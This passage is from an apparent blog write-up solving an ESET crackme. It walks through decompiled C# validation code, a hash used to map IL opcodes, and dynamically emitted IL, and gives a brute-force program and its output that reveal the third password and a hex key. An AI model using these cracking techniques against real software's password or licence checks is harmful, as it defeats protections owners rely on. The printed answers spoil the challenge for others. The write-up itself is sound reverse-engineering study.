        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x200, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x100, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x80, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x40, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x20, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x10, &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x900, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x880, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x840, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x820, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x810, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x808, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x804,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x802, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x801, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x500, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x480, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x440, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x420, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x410,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x408, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x404, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x402, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x401, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x300, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x280, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x240,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x220, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x210, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x208, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x204, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x202, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x201, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xB00,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA80, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA40, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA20, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA10, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA08, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA04, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA02,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA01, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xD00, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC80, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC40, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC20, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC10, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC08,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC04, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC02, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xC01, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x680, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x640, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x620, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x610,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x608, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x604, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x602, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x601, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x82, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x42, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x22, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x12,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xA, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x842, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x812, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x80A, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x806, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x442, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x422,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x412, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x40A, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x242, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x222, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x212, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x20A, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x206, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x400, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x800
    };

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; arr.Length; ++i)
        lstInts.Add(arr[i]);
}

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;bool&lt;/span&gt; validate(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; str1, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; str2)
{
    List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint&lt;/span&gt;&amp;gt; iList = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint&lt;/span&gt;&amp;gt;();
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; str1.Length; i += &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;)
    {
        iList.Add(Convert.ToInt32(str1.Substring(i, &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;), &lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;));
    }
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (str2.Length &amp;gt; lstChars.Count)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;false&lt;/span&gt;;
    }
    
    HashIt computeHash = GetMethod(iList.toArray());
    InitHashtable();
    Hashtable A = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; Hashtable();

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; lstChars.Count; ++i)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;ulong&lt;/span&gt; hash = computeHash(i &amp;lt; str2.Length ? lstChars[i]+str2[i] : lstChars[i]);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (! H.containsKey(hash))
        {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;false&lt;/span&gt;;
        }
        A.Add(lstChars[i], H[hash]);
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;true&lt;/span&gt;;
}

HashIt GetMethod(List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint&lt;/span&gt;&amp;gt; lst)
{
    MethodInfo methInfo = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(DynMethod.DynMethodFactory).GetMethod(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;createMethod&amp;#34;&lt;/span&gt;);
    DynamicMethod dynMeth = methInfo.Invoke(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;object&lt;/span&gt;[] { lst });
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; dynMeth.CreateDelegate(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(HashIt));
}

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; InitHashtable()
{
    H = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; Hashtable();
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;byte&lt;/span&gt;[] data = GetDecryptedResource(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xFF00);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; lstChars.Count; ++i)
    {
        H.Add(BitConverter.ToUInt64(data, i*&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;), lstInts[i]);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now in &lt;code&gt;DynMethodFactory.CreateMethod&lt;/code&gt;, we have&lt;/p&gt;
&lt;p&gt;For all opcodes except &lt;strong&gt;break&lt;/strong&gt;, a hashtable is created whose key consists of the hash and the corresponding value is an &lt;code&gt;OpCodes&lt;/code&gt; instance. Here is the algorithm that maps an opcode to its hash&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;hash&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* name)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; ans = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; name[i]; ++i)
    {
        ans += name[i];
        ans += ans &amp;lt;&amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;;
        ans ^= ans &amp;gt;&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;;
    }
    ans += ans &amp;lt;&amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;;
    ans ^= ans &amp;gt;&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans + (ans &amp;lt;&amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now the createMethod takes an array of unsigned ints and produces the following code. Let’s name the array &lt;strong&gt;arr&lt;/strong&gt; and the hashtable as &lt;strong&gt;table&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    nop
    ldc.i8 0x2AAAAAAAAAAAAB67      ; int1
    stloc.0
    ldc.i4.0
    stloc.1
    br.s L0
L1:
    nop
    ldloc.0
    table[arr[0]]
    ldloc.1
    callvirt [string!get_Chars]
    conv.u8
    add
    stloc.0
    ldloc.0
    ldc.i8 0x2AAAAAAAAAAAAB6F      ; int2
    table[arr[1]]
    stloc.0
    nop
    ldloc.1
    ldc.i4.1
    add
    stloc.1
L0:
    ldloc.1
    ldarg.0
    callvirt [string!get_Length]
    clt
    stloc.3
    ldloc.3
    brtrue.s L1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_Chars&lt;/code&gt; takes two parameters - string, offset and returns the character at the given offset. Clearly, &lt;strong&gt;arr[0]&lt;/strong&gt; must be the hash of the instruction &lt;strong&gt;ldarg.0&lt;/strong&gt; as the first parameter must be a string.&lt;/p&gt;
&lt;p&gt;The hashtable H&amp;rsquo;s keys are the contents of the decrypted resource 0xFF00. And each key is an unsigned int64. Notice that the integers labelled int1 and int2 differ by 8. So the candidate choices for arr[1] are &lt;strong&gt;ADD&lt;/strong&gt;, &lt;strong&gt;MUL&lt;/strong&gt;, &lt;strong&gt;OR&lt;/strong&gt;. We cannot use &lt;em&gt;SUB&lt;/em&gt;, &lt;em&gt;XOR&lt;/em&gt;, &lt;em&gt;DIV&lt;/em&gt; as the resulting value would decrease to less than 64 bits and no unary operators can be used as there are two uint64 operands on the stack.&lt;/p&gt;
&lt;p&gt;To get the string str2 in validate routine, I have used bruteforce. Here&amp;rsquo;s my code&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// run.cs
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;System&lt;/span&gt;;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;System.IO&lt;/span&gt;;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;System.Reflection&lt;/span&gt;;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;System.Reflection.Emit&lt;/span&gt;;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;CalibrationCode&lt;/span&gt;
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;delegate&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;bool&lt;/span&gt; HashChecker(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;ulong&lt;/span&gt; hash);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;delegate&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;ulong&lt;/span&gt; Hash(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; s);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; Main()
    {
        OpCode[] candidates = {
            OpCodes.Add, OpCodes.Mul, OpCodes.Or
        };
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; hashes = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;ulong&lt;/span&gt;[&lt;span style=&#34;color:#3677a9&#34;&gt;86&lt;/span&gt;];
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt; =  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;0123456789ABCDEFGHIJKLMNOPQR/STUVWXYZabcdefghijklmnopqrstuvwxyz:#@\\\&amp;#34;.&amp;lt;(+|$*);,%_&amp;gt;? -&amp;amp;&amp;#34;&lt;/span&gt;;

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; fS = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; FileStream(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;FF00.bin_dec.bin&amp;#34;&lt;/span&gt;,
            FileMode.Open, FileAccess.Read))
        {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; binR = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; BinaryReader(fS))
            {
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;86&lt;/span&gt;; ++i)
                    hashes[i] = binR.ReadUInt64();
            }
        }

        HashChecker isHashPresent = (hash) =&amp;gt; {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;86&lt;/span&gt;; ++i)
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (hashes[i] == hash)
                    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;true&lt;/span&gt;;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;false&lt;/span&gt;;
        };

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; charAt = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;).GetMethod(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;get_Chars&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; len = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;).GetMethod(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;get_Length&amp;#34;&lt;/span&gt;);

        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; op &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; candidates)
        {
            DynamicMethod dynMeth = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; DynamicMethod(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Hash&amp;#34;&lt;/span&gt;,
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;ulong&lt;/span&gt;), &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; Type[] { &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;) });
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; ilGen = dynMeth.GetILGenerator();

            ilGen.DeclareLocal(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;ulong&lt;/span&gt;), &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;true&lt;/span&gt;);
            ilGen.DeclareLocal(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;), &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;true&lt;/span&gt;);
            ilGen.DeclareLocal(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;), &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;true&lt;/span&gt;);
            ilGen.Emit(OpCodes.Ldarg_0);
            ilGen.Emit(OpCodes.Call, len);
            ilGen.Emit(OpCodes.Stloc_2);
            ilGen.Emit(OpCodes.Ldc_I8, &lt;span style=&#34;color:#3677a9&#34;&gt;3074457345618258791L&lt;/span&gt;);
            ilGen.Emit(OpCodes.Stloc_0);
            ilGen.Emit(OpCodes.Ldc_I4_0);
            ilGen.Emit(OpCodes.Stloc_1);
            Label l0 = ilGen.DefineLabel();
            Label l1 = ilGen.DefineLabel();
            ilGen.Emit(OpCodes.Br_S, l0);
            ilGen.MarkLabel(l1);
            ilGen.Emit(OpCodes.Ldarg_0);
            ilGen.Emit(OpCodes.Ldloc_1);
            ilGen.Emit(OpCodes.Call, charAt);
            ilGen.Emit(OpCodes.Conv_I8);
            ilGen.Emit(OpCodes.Ldloc_0);
            ilGen.Emit(OpCodes.Add);
            ilGen.Emit(OpCodes.Ldc_I8, &lt;span style=&#34;color:#3677a9&#34;&gt;3074457345618258799L&lt;/span&gt;);
            ilGen.Emit(op);
            ilGen.Emit(OpCodes.Stloc_0);
            ilGen.Emit(OpCodes.Ldloc_1);
            ilGen.Emit(OpCodes.Ldc_I4_1);
            ilGen.Emit(OpCodes.Add);
            ilGen.Emit(OpCodes.Stloc_1);
            ilGen.MarkLabel(l0);
            ilGen.Emit(OpCodes.Ldloc_1);
            ilGen.Emit(OpCodes.Ldloc_2);
            ilGen.Emit(OpCodes.Blt_S, l1);
            ilGen.Emit(OpCodes.Ldloc_0);
            ilGen.Emit(OpCodes.Ret);

            Hash hashIt = (Hash) dynMeth.CreateDelegate(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(Hash));
            &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// check it now.
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; code = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;

            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;.Length; ++i)
            {
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; j = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; j &amp;lt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;.Length; ++j)
                {
                    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; str = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;.Format(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;{0}{1}&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;[i], &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;[j]);
                    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (isHashPresent(hashIt(str)))
                        code += &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;[j];
                }
            }

            Console.WriteLine(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[+] Using {0} =&amp;gt; {1}&amp;#34;&lt;/span&gt;, op.Name, code);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which gives the output&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;x0r19x91@x0r19x91 /cygdrive/c/Users/x0r19x91/Desktop/ESET/crackme
$ ./run
[+] Using &lt;span style=&#34;color:#40ffff&#34;&gt;add&lt;/span&gt; =&amp;gt;
[+] Using &lt;span style=&#34;color:#40ffff&#34;&gt;mul&lt;/span&gt; =&amp;gt; Infant Jesus of Prague
[+] Using &lt;span style=&#34;color:#40ffff&#34;&gt;or&lt;/span&gt; =&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the value of str2 in validate routine is &lt;code&gt;Infant Jesus of Prague&lt;/code&gt; which is the third password. For str1, we need the hash values of &lt;strong&gt;LDARG.0&lt;/strong&gt; and &lt;strong&gt;MUL&lt;/strong&gt;&lt;br&gt;
Executing &lt;code&gt;hash()&lt;/code&gt; and concatenating, we get str1 - &lt;strong&gt;0364ABE72D29C96C&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The program now sends MarkCommand (2) for the resource 0xFF00 to the EsetCrackmePipe. Command2 means mark the resource in the marked array.&lt;/p&gt;
&lt;p&gt;Now a multiline textbox appears and a button labelled &amp;lsquo;Punch it!&amp;rsquo;. For each line in the multiline textbox, it encodes that line into an image and saves it with the name &amp;lsquo;punch_card_X.bmp&amp;rsquo; where X is the index of the line.&lt;/p&gt;
&lt;h2 id=&#34;punchcardreader&#34;&gt;PunchCardReader&lt;/h2&gt;
